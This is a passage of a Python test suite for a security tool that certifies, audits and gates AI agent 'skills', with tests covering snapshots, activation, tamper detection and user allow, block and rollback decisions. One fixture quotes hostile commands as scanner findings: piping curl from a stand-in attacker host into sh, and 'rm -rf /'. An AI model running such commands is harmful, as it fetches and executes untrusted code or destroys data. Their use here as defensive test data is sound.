    audit_env = ws.env({"AGENT_SEC_DATA_DIR": str(event_data)})
    reset_security_event_writers()
    try:
        cli_result = run_skill_ledger(
            ["audit", str(canonical)],
            env_extra=audit_env,
        )
    finally:
        reset_security_event_writers()

    assert resolver_calls == [canonical]
    assert cli_result.returncode == 1
    assert "Traceback" not in cli_result.stderr
    assert str(backing) not in cli_result.stdout + cli_result.stderr
    assert backing_marker not in cli_result.stdout + cli_result.stderr
    stdout_result = parse_json_output(cli_result.stdout)
    assert stdout_result["canonicalSkillDir"] == str(canonical)
    assert stdout_result["valid"] is False
    assert stdout_result["versions_checked"] == 1
    assert any(error["versionId"] == "v000001" for error in stdout_result["errors"])

    assert len(forwarded) == 1
    action_result = forwarded[0]
    assert action_result.success is False
    assert action_result.exit_code == 1
    assert json.loads(action_result.stdout) == stdout_result
    assert action_result.data["command"] == "audit"
    assert action_result.data["valid"] is False
    assert str(backing) not in json.dumps(action_result.data)
    assert str(backing) not in action_result.stdout
    assert str(backing) not in action_result.error
    assert backing_marker not in json.dumps(action_result.data)
    assert backing_marker not in action_result.stdout
    assert backing_marker not in action_result.error

    state_after = {
        str(path.relative_to(meta_dir)): path.read_bytes()
        for path in sorted(meta_dir.rglob("*"))
        if path.is_file()
    }
    assert state_after == state_before

    jsonl_events = read_security_events(event_data)
    audit_jsonl = next(
        event
        for event in jsonl_events
        if event["details"]["result"].get("command") == "audit"
    )
    assert audit_jsonl["result"] == "failed"
    assert audit_jsonl["details"]["result"]["valid"] is False
    assert str(backing) not in json.dumps(audit_jsonl)
    assert backing_marker not in json.dumps(audit_jsonl)

    monkeypatch.setenv("AGENT_SEC_DATA_DIR", str(event_data))
    runtime = DaemonRuntime(socket_path=event_data / "daemon.sock")
    list_result = security_events_list_handler(
        DaemonRequest(
            method="sec.events.list",
            params={
                "category": "skill_ledger",
                "result": "failed",
                "include_details": True,
            },
        ),
        runtime,
    )
    daemon_audit = next(
        item
        for item in list_result.data["items"]
        if item["event_id"] == audit_jsonl["event_id"]
    )
    assert daemon_audit["details"]["result"]["command"] == "audit"
    assert daemon_audit["details"]["result"]["valid"] is False
    assert str(backing) not in json.dumps(daemon_audit)
    assert backing_marker not in json.dumps(daemon_audit)


def test_audit_verify_snapshots(ws):
    """--verify-snapshots validates snapshot file hashes match manifest."""
    skill = make_skill(ws.skills_dir, "audit-snap", {"s.txt": "snapshot-test"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "audit-s.json",
        [
            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    r = run_skill_ledger(
        ["audit", str(skill), "--verify-snapshots"],
        env_extra=env,
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["valid"] is True


def test_audit_verify_snapshots_rejects_symlink(ws):
    """--verify-snapshots rejects symlinks added after snapshot creation."""
    skill = make_skill(ws.skills_dir, "audit-snap-symlink", {"s.txt": "snapshot-test"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "audit-snap-symlink.json",
        [{"rule": "ok", "level": "pass", "message": "ok"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    outside = ws.root / "outside-secret.txt"
    outside.write_text("secret")
    (skill / ".skill-meta" / "versions" / "v000001.snapshot" / "escape").symlink_to(
        outside
    )

    r = run_skill_ledger(
        ["audit", str(skill), "--verify-snapshots"],
        env_extra=env,
    )
    assert r.returncode == 1, f"expected invalid audit, got {r.stdout}"
    out = parse_json_output(r.stdout)
    assert out["valid"] is False
    assert any("symbolic link" in err["error"] for err in out["errors"])


# ── Group 6b: runtime activation resolver ─────────────────────────────────


def test_resolve_no_manifest_writes_pending_stub_activation(ws, monkeypatch):
    """resolve on a new skill exposes a safe review stub and creates no version."""
    skill = make_skill(ws.skills_dir, "resolve-new", {"f.txt": "new"})
    env = ws.env()
    xattr_calls = []

    def fake_setxattr(path: str, name: str, value: bytes) -> None:
        xattr_calls.append((path, name, value))

    monkeypatch.setattr(resolver_core.os, "setxattr", fake_setxattr, raising=False)

    out = resolve_skill_activation(skill, env)

    assert out["status"] == "none"
    assert out["activeVersionId"] is None
    assert out["target"] == PENDING_DECISION_TARGET
    assert "reason" not in out
    assert out["reasonCode"] == "latest_risk_pending_decision"
    assert out["message"] is not None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["f.txt"])
    assert out["activationXattr"] == {
        "name": resolver_core.activation_xattr_name(),
        "written": True,
        "available": True,
    }
    assert len(xattr_calls) == 1
    assert xattr_calls[0][0] == str(skill)
    assert xattr_calls[0][1] == resolver_core.activation_xattr_name()
    assert xattr_calls[0][2] == (skill / ".skill-meta" / "activation.json").read_bytes()
    assert decode_xattr_activation(xattr_calls[0][2]) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert not (skill / ".skill-meta" / "versions" / "v000001.json").exists()
    assert not (skill / ".skill-meta" / "versions" / "v000001.snapshot").exists()


def test_resolve_pass_targets_latest_snapshot(ws, monkeypatch):
    """pass manifests activate their immutable snapshot."""
    skill = make_skill(ws.skills_dir, "resolve-pass", {"tool.sh": "echo ok\n"})
    env = ws.env()
    xattr_calls = []

    def fake_setxattr(path: str, name: str, value: bytes) -> None:
        xattr_calls.append((path, name, value))

    monkeypatch.setattr(resolver_core.os, "setxattr", fake_setxattr, raising=False)
    findings = write_findings_file(
        ws.fixtures,
        "resolve-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    out = resolve_skill_activation(skill, env)

    assert out["status"] == "pass"
    assert out["activeVersionId"] == "v000001"
    assert out["target"] == ".skill-meta/versions/v000001.snapshot"
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": ".skill-meta/versions/v000001.snapshot",
    }
    assert out["activationXattr"]["written"] is True
    assert out["activationXattr"]["name"] == resolver_core.activation_xattr_name()
    assert len(xattr_calls) == 1
    assert xattr_calls[0][0] == str(skill)
    assert xattr_calls[0][1] == resolver_core.activation_xattr_name()
    assert xattr_calls[0][2] == (skill / ".skill-meta" / "activation.json").read_bytes()
    assert decode_xattr_activation(xattr_calls[0][2]) == {
        "schemaVersion": 1,
        "target": ".skill-meta/versions/v000001.snapshot",
    }
    assert (skill / out["target"]).is_dir()


def test_resolve_skips_pass_version_when_verify_returns_false(ws):
    """activation fails closed when a backend returns False for signature verify."""
    skill = make_skill(ws.skills_dir, "resolve-verify-false", {"tool.sh": "echo ok\n"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-verify-false.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    out = resolve_skill_activation_with_backend(skill, env, _VerifyFalseBackend())

    assert out["status"] == "tampered"
    assert out["activeVersionId"] is None
    assert out["target"] == PENDING_DECISION_TARGET
    assert out["reasonCode"] == "tampered"
    assert out["message"] is not None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["tool.sh"])


def test_resolve_skips_pass_version_when_public_key_is_missing(ws):
    """activation fails closed when signature verification cannot load a key."""
    skill = make_skill(ws.skills_dir, "resolve-missing-key", {"tool.sh": "echo ok\n"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-missing-key.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    out = resolve_skill_activation_with_backend(skill, env, _KeyMissingBackend())

    assert out["status"] == "tampered"
    assert out["activeVersionId"] is None
    assert out["target"] == PENDING_DECISION_TARGET
    assert out["reasonCode"] == "tampered"
    assert out["message"] is not None
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["tool.sh"])


def test_resolve_drifted_source_keeps_previous_pass_snapshot(ws):
    """source changes remain candidate-only until a new pass snapshot is created."""
    skill = make_skill(ws.skills_dir, "resolve-drift", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "resolve-drift-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    (skill / "data.txt").write_text("v2 candidate")
    out = resolve_skill_activation(skill, env)

    assert out["status"] == "drifted"
    assert out["target"] == ".skill-meta/versions/v000001.snapshot"
    assert out["reasonCode"] == "root_drift"
    assert out["message"] is not None


def test_resolve_xattr_failure_keeps_activation_file(ws, monkeypatch):
    """xattr failures are best effort and do not break activation.json writes."""
    skill = make_skill(ws.skills_dir, "resolve-xattr-failure", {"data.txt": "v1"})
    env = ws.env()

    def fail_setxattr(path: str, name: str, value: bytes) -> None:
        raise OSError("xattr unavailable")

    monkeypatch.setattr(resolver_core.os, "setxattr", fail_setxattr, raising=False)

    out = resolve_skill_activation(skill, env)

    assert out["target"] == PENDING_DECISION_TARGET
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["data.txt"])
    assert out["activationXattr"]["name"] == resolver_core.activation_xattr_name()
    assert out["activationXattr"]["written"] is False
    assert out["activationXattr"]["available"] is True
    assert "xattr unavailable" in out["activationXattr"]["error"]


def test_resolve_missing_xattr_support_keeps_activation_file(ws, monkeypatch):
    """Platforms without os.setxattr still persist activation.json."""
    skill = make_skill(ws.skills_dir, "resolve-xattr-missing", {"data.txt": "v1"})
    env = ws.env()
    monkeypatch.delattr(resolver_core.os, "setxattr", raising=False)

    out = resolve_skill_activation(skill, env)

    assert out["target"] == PENDING_DECISION_TARGET
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": PENDING_DECISION_TARGET,
    }
    assert_pending_stub(skill, leaked_files=["data.txt"])
    assert out["activationXattr"] == {
        "name": resolver_core.activation_xattr_name(),
        "written": False,
        "available": False,
        "error": "os.setxattr unavailable",
    }


def test_resolve_without_writing_reports_stable_xattr_status(ws):
    """Dry-run activation exposes a stable activationXattr debug shape."""
    skill = make_skill(ws.skills_dir, "resolve-dry-run", {"data.txt": "v1"})
    env = ws.env()
    previous = {key: os.environ.get(key) for key in env}
    os.environ.update(env)
    try:
        out = resolver_core.resolve_activation(
            str(skill),
            NativeEd25519Backend(),
            write_activation=False,
        )
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    assert out["activationXattr"] == {
        "name": resolver_core.activation_xattr_name(),
        "written": False,
        "available": False,
        "skipped": True,
    }
    assert not (skill / ".skill-meta" / "activation.json").exists()


def test_decide_allow_activates_latest_deny_snapshot_under_current_policy(ws):
    """A user allow decision overrides scanStatus for the latest signed version."""
    skill = make_skill(ws.skills_dir, "decision-allow", {"data.txt": "v1"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-allow-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-allow-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    before = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert before["activeVersionId"] == "v000001"

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "allow", "--reason", "reviewed"],
        env_extra=env,
    )
    assert r.returncode == 0, f"decide exit {r.returncode}: {r.stderr}"
    decision = parse_json_output(r.stdout)
    assert decision["userDecision"]["action"] == "allow"
    assert decision["versionId"] == "v000002"
    assert sorted(
        p.name for p in (skill / ".skill-meta" / "versions").glob("*.json")
    ) == [
        "v000001.json",
        "v000002.json",
    ]

    after = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert after["activeVersionId"] == "v000002"
    assert after["target"] == ".skill-meta/versions/v000002.snapshot"
    assert after["reasonCode"] == "user_allow"
    assert after["message"] is None

    r = run_skill_ledger(["show", str(skill)], env_extra=env)
    assert r.returncode == 0, f"show exit {r.returncode}: {r.stderr}"
    shown = parse_json_output(r.stdout)
    assert shown["latestStatus"] == "deny"
    assert shown["activeVersionId"] == "v000002"
    assert shown["userDecision"]["action"] == "allow"
    assert shown["reasonCode"] == "user_allow"
    assert shown["message"] is None
    assert shown["warnings"] == []


def test_decide_allow_cleans_pending_stub_for_deny_only_skill(ws):
    """Allowing a hidden deny-only skill removes the temporary review stub."""
    skill = make_skill(ws.skills_dir, "decision-allow-pending", {"data.txt": "v1"})
    env = ws.env()
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-allow-pending-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    before = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert before["target"] == PENDING_DECISION_TARGET
    assert before["activeVersionId"] is None
    assert_pending_stub(skill, leaked_files=["data.txt"])

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "allow", "--reason", "reviewed"],
        env_extra=env,
    )
    assert r.returncode == 0, f"decide exit {r.returncode}: {r.stderr}"

    assert not (skill / PENDING_DECISION_TARGET).exists()
    assert read_activation(skill) == {
        "schemaVersion": 1,
        "target": ".skill-meta/versions/v000001.snapshot",
    }


def test_decide_block_hides_skill_even_when_pass_snapshot_exists(ws):
    """A block decision hides the whole skill instead of falling back."""
    skill = make_skill(ws.skills_dir, "decision-block", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "decision-block-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-block-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    r = run_skill_ledger(
        ["decide", str(skill), "--action", "block", "--reason", "do not use"],
        env_extra=env,
    )
    assert r.returncode == 0, f"decide exit {r.returncode}: {r.stderr}"

    out = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert out["activeVersionId"] is None
    assert out["target"] is None
    assert read_activation(skill) == {"schemaVersion": 1, "target": None}

    r = run_skill_ledger(["show", str(skill)], env_extra=env)
    assert r.returncode == 0, f"show exit {r.returncode}: {r.stderr}"
    shown = parse_json_output(r.stdout)
    assert shown["active"] is None
    assert shown["target"] is None
    assert shown["reasonCode"] == "user_block"
    assert shown["message"] is None
    assert shown["userDecision"]["action"] == "block"
    assert shown["warnings"] == []
    assert shown["consistencyReason"] == "user decision block hides this skill"


def test_decide_block_cleans_pending_stub_for_deny_only_skill(ws):
    """Blocking a hidden deny-only skill removes the temporary review stub."""
    skill = make_skill(ws.skills_dir, "decision-block-pending", {"data.txt": "v1"})
    env = ws.env()
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-block-pending-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    before = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert before["target"] == PENDING_DECISION_TARGET
    assert before["activeVersionId"] is None
    assert_pending_stub(skill, leaked_files=["data.txt"])

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "block", "--reason", "do not use"],
        env_extra=env,
    )
    assert r.returncode == 0, f"decide exit {r.returncode}: {r.stderr}"

    assert not (skill / PENDING_DECISION_TARGET).exists()
    assert read_activation(skill) == {"schemaVersion": 1, "target": None}


def test_decide_always_allow_inherits_to_future_versions(ws):
    """always_allow is copied to future versions and keeps latest active."""
    skill = make_skill(ws.skills_dir, "decision-always-allow", {"data.txt": "v1"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-always-allow-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-always-allow-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    r = run_skill_ledger(
        ["decide", str(skill), "--action", "always_allow"],
        env_extra=env,
    )
    assert r.returncode == 0, f"decide exit {r.returncode}: {r.stderr}"

    (skill / "data.txt").write_text("v2 risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    latest = read_latest_manifest(skill)
    assert latest["versionId"] == "v000002"
    assert latest["userDecision"]["action"] == "always_allow"
    out = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert out["activeVersionId"] == "v000002"


def test_decide_block_does_not_inherit_to_future_versions(ws):
    """block hides only its own version; future versions fall back to policy."""
    skill = make_skill(ws.skills_dir, "decision-block-inherit", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "decision-block-inherit-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    run_skill_ledger(
        ["decide", str(skill), "--action", "block"],
        env_extra=env,
    )

    (skill / "data.txt").write_text("v2 safe")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    latest = read_latest_manifest(skill)
    assert latest["versionId"] == "v000002"
    assert latest.get("userDecision") is None
    out = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert out["activeVersionId"] == "v000002"
    assert out["target"] == ".skill-meta/versions/v000002.snapshot"


def test_decide_clear_returns_to_activation_policy(ws):
    """Clearing a decision makes resolver fall back to activationPolicy."""
    skill = make_skill(ws.skills_dir, "decision-clear", {"data.txt": "v1"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-clear-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-clear-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    run_skill_ledger(
        ["decide", str(skill), "--action", "allow"],
        env_extra=env,
    )
    assert (
        resolve_skill_activation(skill, env, policy="pass_warn_only")["activeVersionId"]
        == "v000002"
    )

    r = run_skill_ledger(["decide", str(skill), "--clear"], env_extra=env)
    assert r.returncode == 0, f"clear exit {r.returncode}: {r.stderr}"

    latest = read_latest_manifest(skill)
    assert latest.get("userDecision") is None
    out = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert out["activeVersionId"] == "v000001"


def test_decide_rollback_restores_pass_snapshot_and_records_new_version(ws):
    """Rollback is a decide action that creates a new version from a pass snapshot."""
    skill = make_skill(ws.skills_dir, "decision-rollback", {"data.txt": "safe"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "rollback", "--version", "v000001"],
        env_extra=env,
    )
    assert r.returncode == 0, f"rollback exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)

    assert out["versionId"] == "v000003"
    assert out["userDecision"]["action"] == "rollback"
    assert out["userDecision"]["targetVersionId"] == "v000001"
    assert (skill / "data.txt").read_text() == "safe"

    activation = resolve_skill_activation(skill, env, policy="pass_warn_only")
    assert activation["activeVersionId"] == "v000003"
    assert activation["target"] == ".skill-meta/versions/v000003.snapshot"


def test_decide_rollback_skips_root_symlinks_when_backup_restores(ws):
    """Rollback must not follow current-root symlinks into backups or restores."""
    skill = make_skill(ws.skills_dir, "decision-rollback-symlink", {"data.txt": "safe"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-symlink-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-symlink-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    outside = ws.root / "outside-secret"
    outside.mkdir()
    (outside / "secret.txt").write_text("do not copy")
    (skill / "outside").symlink_to(outside, target_is_directory=True)

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "rollback", "--version", "v000001"],
        env_extra=env,
    )
    assert r.returncode == 0, f"rollback exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)

    backup = Path(out["rollbackBackup"])
    assert not (backup / "outside").exists()
    assert not (skill / "outside").exists()
    assert (skill / "data.txt").read_text() == "safe"


def test_decide_rollback_acquires_skill_lock(ws, monkeypatch):
    skill = make_skill(ws.skills_dir, "decision-rollback-lock", {"data.txt": "safe"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-lock-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-lock-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )
    flock_calls = []
    fake_fcntl = types.SimpleNamespace(
        LOCK_EX=1,
        LOCK_UN=2,
        flock=lambda _fd, operation: flock_calls.append(operation),
    )
    monkeypatch.setattr(decision_core, "fcntl", fake_fcntl, raising=False)

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "rollback", "--version", "v000001"],
        env_extra=env,
    )

    assert r.returncode == 0, f"rollback exit {r.returncode}: {r.stderr}"
    assert flock_calls == [fake_fcntl.LOCK_EX, fake_fcntl.LOCK_UN]


def test_decide_rollback_defaults_to_active_version(ws):
    """Rollback without --version restores the currently active snapshot."""
    write_skill_ledger_config(ws.root, {"activationPolicy": "pass_warn_only"})
    skill = make_skill(ws.skills_dir, "decision-rollback-default", {"data.txt": "safe"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-default-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-default-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "rollback"],
        env_extra=env,
    )
    assert r.returncode == 0, f"rollback exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)

    assert out["versionId"] == "v000003"
    assert out["userDecision"]["action"] == "rollback"
    assert out["userDecision"]["targetVersionId"] == "v000001"
    assert (skill / "data.txt").read_text() == "safe"


def test_decide_rollback_without_version_errors_when_active_is_empty(ws):
    """Rollback without --version fails when no snapshot is currently active."""
    write_skill_ledger_config(ws.root, {"activationPolicy": "pass_warn_only"})
    skill = make_skill(
        ws.skills_dir, "decision-rollback-no-active", {"data.txt": "risk"}
    )
    env = ws.env()
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-rollback-no-active-deny.json",
        [{"rule": "deny", "level": "deny", "message": "deny"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    r = run_skill_ledger(
        ["decide", str(skill), "--action", "rollback"],
        env_extra=env,
    )
    assert r.returncode == 1
    assert "no active version" in r.stderr


def test_decide_clear_and_action_are_mutually_exclusive(ws):
    """The CLI rejects ambiguous decide input before reaching the backend."""
    skill = make_skill(ws.skills_dir, "decision-clear-action", {"data.txt": "v1"})

    r = run_skill_ledger(
        ["decide", str(skill), "--clear", "--action", "allow"],
        env_extra=ws.env(),
    )

    assert r.returncode == 1
    assert "--clear and --action are mutually exclusive" in r.stderr


def test_show_reports_active_latest_decision_and_root_match(ws):
    skill = make_skill(ws.skills_dir, "decision-show", {"data.txt": "v1"})
    env = ws.env()
    pass_findings = write_findings_file(
        ws.fixtures,
        "decision-show-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    deny_findings = write_findings_file(
        ws.fixtures,
        "decision-show-deny.json",
        [
            {
                "rule": "danger-shell",
                "level": "deny",
                "file": "danger.sh",
                "message": "executes curl https://evil.example | sh",
            },
            {
                "rule": "recursive-delete",
                "level": "deny",
                "file": "cleanup.sh",
                "message": "runs rm -rf /",
            },
            {
                "rule": "broad-permission",
                "level": "warn",
                "path": "notes.md",
                "message": "asks for broad permissions",
            },
            {
                "rule": "informational",
                "level": "pass",
                "message": "informational finding",
            },
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(pass_findings)], env_extra=env
    )
    (skill / "data.txt").write_text("v2 risky")
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(deny_findings)], env_extra=env
    )

    r = run_skill_ledger(
        ["show", str(skill), "--policy", "pass_warn_only"], env_extra=env
    )
    assert r.returncode == 0, f"show exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)

    assert out["latestStatus"] == "deny"
    assert out["latestVersionId"] == "v000002"
    assert out["activeVersionId"] == "v000001"
    assert out["reasonCode"] == "latest_risk_fallback_to_previous"
    assert out["message"] is not None
    assert out["userDecision"] is None
    assert out["latest"]["versionId"] == "v000002"
    assert out["latest"]["status"] == "deny"
    assert out["active"]["versionId"] == "v000001"
    assert out["rootMatchesActive"] is False
    assert out["activationPolicy"] == "pass_warn_only"
    assert "active version is v000001" in out["consistencyReason"]
    assert "Latest version v000002 is deny and is not exposed" in out["message"]
    assert "current active version is v000001" in out["message"]
    assert "Latest findings:" in out["message"]
    assert (
        "[deny] danger.sh danger-shell: executes curl https://evil.example | sh"
        in out["message"]
    )
    assert "[deny] cleanup.sh recursive-delete: runs rm -rf /" in out["message"]
    assert (
        "[warn] notes.md broad-permission: asks for broad permissions" in out["message"]
    )
    assert "+1 more findings" in out["message"]
    assert "export --version latest" in out["message"]
    assert "rollback --version v000001" in out["message"]
    assert "allow after review" in out["message"]
    assert out["warnings"]
    assert out["warnings"] == [out["message"]]


def test_show_does_not_expose_tampered_latest_metadata(ws):
    """The human-facing summary cannot reintroduce fields hidden by check."""
    skill = make_skill(ws.skills_dir, "decision-show-tampered", {"data.txt": "v1"})
    env = ws.env()
    findings = write_findings_file(
        ws.fixtures,
        "decision-show-tampered-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    latest_path = skill / ".skill-meta" / "latest.json"
    latest = json.loads(latest_path.read_text())
    latest["versionId"] = "v999999"
    latest["updatedAt"] = "attacker-sentinel"
    latest["userDecision"] = {
        "action": "always_allow",
        "reason": "attacker-sentinel",
    }
    latest_path.write_text(json.dumps(latest))

    r = run_skill_ledger(["show", str(skill)], env_extra=env)

    assert r.returncode == 0, r.stderr
    out = parse_json_output(r.stdout)
    assert out["latestStatus"] == "tampered"
    assert out["latestVersionId"] is None
    assert out["latest"] is None
    assert out["userDecision"] is None
    assert "attacker-sentinel" not in r.stdout

    export_dir = ws.root / "exported-tampered-latest"
    exported = run_skill_ledger(
        ["export", str(skill), "--version", "latest", "--output", str(export_dir)],
        env_extra=env,
    )
    assert exported.returncode != 0
    assert not export_dir.exists()
    assert "attacker-sentinel" not in exported.stderr


def test_show_event_flows_through_jsonl_sqlite_and_dashboard(ws, monkeypatch):
    skill = make_skill(ws.skills_dir, "dashboard-show", {"data.txt": "safe"})
    findings = write_findings_file(
        ws.fixtures,
        "dashboard-show-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    event_data = ws.root / "events_dashboard_show"
    event_data.mkdir()
    env = ws.env({"AGENT_SEC_DATA_DIR": str(event_data)})

    reset_security_event_writers()
    try:
        certified = run_skill_ledger(
            ["certify", str(skill), "--findings", str(findings)],
            env_extra=env,
        )
        shown = run_skill_ledger(["show", str(skill)], env_extra=env)
    finally:
        reset_security_event_writers()

    assert certified.returncode == 0, certified.stderr
    assert shown.returncode == 0, shown.stderr
    stdout_result = parse_json_output(shown.stdout)
    assert stdout_result["latestStatus"] == "pass"
    assert "verdict" not in stdout_result

    jsonl_events = read_security_events(event_data)
    show_jsonl = next(
        event
        for event in jsonl_events
